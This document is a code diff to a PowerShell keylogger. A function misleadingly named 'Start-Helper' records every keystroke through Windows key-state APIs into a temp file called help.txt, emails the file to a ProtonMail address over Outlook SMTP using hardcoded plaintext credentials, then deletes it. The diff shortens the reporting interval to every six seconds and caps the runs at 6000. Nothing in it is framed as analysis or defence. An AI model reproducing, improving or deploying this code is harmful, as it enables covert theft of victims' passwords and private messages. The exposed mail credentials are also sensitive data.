@@ -1,4 +1,5 @@
-$RunTimeP = 60    # Time in minutes
+$TimesToRun = 6000
+$RunTimeP = 0.1    # Time in minutes
 $From = "luccasmachado001@outlook.com"
 $Pass = "hbzgnuqauqooxcbq"
 $To = "carlosalberto58@protonmail.com"
@@ -7,7 +8,6 @@ $body = "report"
 $SMTPServer = "smtp-mail.outlook.com"    # Outlook SMTP
 $SMTPPort = "587"
 $credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
-############################
 
 function Start-Helper($Path="$env:temp\help.txt") {
     $signatures = @'
@@ -26,47 +26,34 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     $null = New-Item -Path $Path -ItemType File -Force
 
     try {
-        $TimeStart = Get-Date
-        $TimeEnd = $TimeStart.addminutes($RunTimeP)
-        
+        $Runner = 0
         while ($true) {
-            Start-Sleep -Milliseconds 40
-            
-            for ($ascii = 9; $ascii -le 254; $ascii++) {
-                $state = $API::GetAsyncKeyState($ascii)
-
-                if ($state -eq -32767) {
-                    $null = [console]::CapsLock
-
-                    $virtualKey = $API::MapVirtualKey($ascii, 3)
-
-                    $kbstate = New-Object Byte[] 256
-                    $checkkbstate = $API::GetKeyboardState($kbstate)
-
-                    $mychar = New-Object -TypeName System.Text.StringBuilder
-
-                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
-                    if ($success) {
-                        [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
+            $TimeStart = Get-Date
+            $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
+            while ($TimesToRun -ge $Runner) {
+                while ($TimeEnd -ge (Get-Date)) {
+                    Start-Sleep -Milliseconds 40
+                    for ($ascii = 9; $ascii -le 254; $ascii++) {
+                        $state = $API::GetAsyncKeyState($ascii)
+                        if ($state -eq -32767) {
+                            $null = [console]::CapsLock
+                            $virtualKey = $API::MapVirtualKey($ascii, 3)
+                            $kbstate = New-Object Byte[] 256
+                            $checkkbstate = $API::GetKeyboardState($kbstate)
+                            $mychar = New-Object -TypeName System.Text.StringBuilder
+                            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+                            if ($success) {
+                                [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
+                            }
+                        }
                     }
                 }
-            }
-            
-            $TimeNow = Get-Date
-            if ($TimeEnd -lt $TimeNow) {
                 send-mailmessage -from $From -to $To -subject $Subject -body $body -Attachment $Path -smtpServer $SMTPServer -port $SMTPPort -credential $credentials -usessl
                 Remove-Item -Path $Path -force
-                $TimeStart = Get-Date
-                $TimeEnd = $TimeStart.addminutes($RunTimeP)
+                $Runner++
+                break  # Exit the inner while loop to restart the process
             }
         }
     }
     finally {
         exit 1
-    }
-}
-
-while ($true) {
-    Start-Helper
-}
